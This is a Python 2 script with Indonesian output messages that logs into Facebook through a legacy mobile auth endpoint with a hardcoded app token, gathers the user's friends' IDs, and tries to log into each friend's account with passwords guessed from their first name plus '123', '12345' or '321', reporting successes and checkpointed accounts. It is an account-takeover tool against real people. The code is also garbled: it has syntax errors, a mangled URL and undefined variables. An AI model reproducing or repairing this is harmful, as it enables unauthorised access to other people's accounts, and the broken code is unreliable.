import os
import sys
import requests
import time
import json
import urllib

def login():

    try:
        token = open('token.txt', 'r')


    except IOError, KeyError:

        user = raw_input(" Username: ")
        password = raw_input(" Password: ")
        url = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+password+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
        dev = url.content
        jas = json.loads(dev)
        if "session_key" in dev:
            print "login Berhasil..."
            token = open('token.txt', 'w').write(jsl['access_token'])
            token.close()
        elif "error_msg" in dev:
            print " Akun Kena Cekpoint"
        else:
            print " Login Gagal..."
    
    except KeyboardInterrupt:
        sys.exit()

def id_teman():
    global id_teman
    try:
        token = open("token.txt", "r").read()

    else:
        try:
            url = requests.get("https://graph.facebook.com/me/friends?access_token="+ token)
            jsl = json.loads(url.text)
            for iqbal in jsl['data']:
                id_teman.append(iqbal['id'])

        except IOError:
            print "Tidak Ada token.."
            os.system("rm -rf token.txt")
            sys.exit()

    except 
def iqbalsup():
    try:
        token = open("token.txt", "r").read()

    else:
        try:
            url = requests.get("://graph.fhttpsacebook.com/" + id_teman + "/?access_token=" + token)
            jsl = json.loads(url.text)
            sandi1 = jsl['first_name'] + "123"
            log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + id_teman + "&locale=en_US&password=" + sandi1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            jsl_iqbal = json.load(log)
            if "access_token" in jsl_iqbal:
                print " [OK] " + id_teman + " | " + sandi1
            elif "www.facebook.com" in jsl_iqbal["error_msg"]:
                print " [CP] " + id_teman + " | " + sandi1
            elif:
                sandi2 = jsl["first_name"] + "12345"
                log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + id_teman + "&locale=en_US&password=" + sandi2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                jsl_iqbal = json.load(log)
                if "access_token" in jsl_iqbal:
                    print " [OK] " + id_teman + " | " + sandi2
                elif "www.facebook.com" in jsl_iqbal["error_msg"]:
                    print " [CP] " + id_teman + " | " + sandi2
                elif:
                    sandi3 = jsl["first_name"] + "321"
                    log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + id_teman + "&locale=en_US&password=" + sandi3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    jsl_iqbal = json.loads(log)
                    if "access_token" in jsl_iqbal:
                        print " [OK] " + id_teman + " | " + sandi3
                    else:
                        if "www.facebook.com" in jsl_iqbal["error_msg"]:
                            print " [CP] " + id_teman + " | " + sandi3

        except:
            pass
    print "selesai"                    

def main():
    login()
    id_teman()
    iqbalsup()

if __name__=="__main__":
    main()
